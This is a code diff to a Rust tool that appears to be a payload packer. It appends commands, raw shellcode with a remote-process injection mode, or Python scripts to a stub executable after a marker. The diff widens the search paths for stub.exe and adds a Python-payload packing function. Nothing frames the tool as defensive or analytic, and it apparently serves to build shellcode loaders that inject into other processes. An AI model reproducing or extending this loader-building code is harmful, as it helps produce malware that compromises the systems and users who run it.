@@ -6,11 +6,32 @@ use std::path::{Path, PathBuf};
 const MARKER: &[u8] = b"RSPKv1\0";
 
 fn read_stub(default_release_first: bool) -> Result<Vec<u8>, String> {
-    let mut stub_path = if default_release_first { PathBuf::from("target/release/stub.exe") } else { PathBuf::from("target/debug/stub.exe") };
-    if !stub_path.exists() {
-        stub_path = if default_release_first { PathBuf::from("target/debug/stub.exe") } else { PathBuf::from("target/release/stub.exe") };
+    let mut candidates: Vec<PathBuf> = Vec::new();
+    if let Ok(exe) = std::env::current_exe() {
+        if let Some(dir) = exe.parent() {
+            candidates.push(dir.join("stub.exe"));
+        }
     }
-    fs::read(&stub_path).map_err(|e| format!("读取Stub失败: {}。请先构建stub: cargo build -p stub --release", e))
+    // project-root relative
+    if default_release_first {
+        candidates.push(PathBuf::from("target/release/stub.exe"));
+        candidates.push(PathBuf::from("target/debug/stub.exe"));
+    } else {
+        candidates.push(PathBuf::from("target/debug/stub.exe"));
+        candidates.push(PathBuf::from("target/release/stub.exe"));
+    }
+    // current_dir relative
+    if let Ok(cwd) = std::env::current_dir() {
+        candidates.push(cwd.join("target/release/stub.exe"));
+        candidates.push(cwd.join("target/debug/stub.exe"));
+        candidates.push(cwd.join("stub.exe"));
+    }
+    for p in candidates {
+        if p.exists() {
+            return fs::read(&p).map_err(|e| format!("读取Stub失败: {}", e));
+        }
+    }
+    Err("读取Stub失败: 未找到 stub.exe，请先构建：cargo build -p stub --release".to_string())
 }
 
 pub fn pack_cmd(cmd: &str, out_path: &Path) -> Result<(), String> {
@@ -40,6 +61,16 @@ pub fn pack_shellcode(sc_path: &Path, out_path: &Path, inj_mode: &str, remote_pa
     }
     payload.extend_from_slice(&(sc.len() as u32).to_le_bytes());
     payload.extend_from_slice(&sc);
+    pack_payload(payload, out_path)
+}
+
+pub fn pack_shellcode_py(py_path: &Path, out_path: &Path) -> Result<(), String> {
+    let script = fs::read_to_string(py_path).map_err(|e| format!("读取Python脚本失败: {}", e))?;
+    let bytes = script.as_bytes();
+    let mut payload = Vec::new();
+    payload.extend_from_slice(b"PY\0");
+    payload.extend_from_slice(&(bytes.len() as u32).to_le_bytes());
+    payload.extend_from_slice(bytes);
     pack_payload(payload, out_path)
 }
 
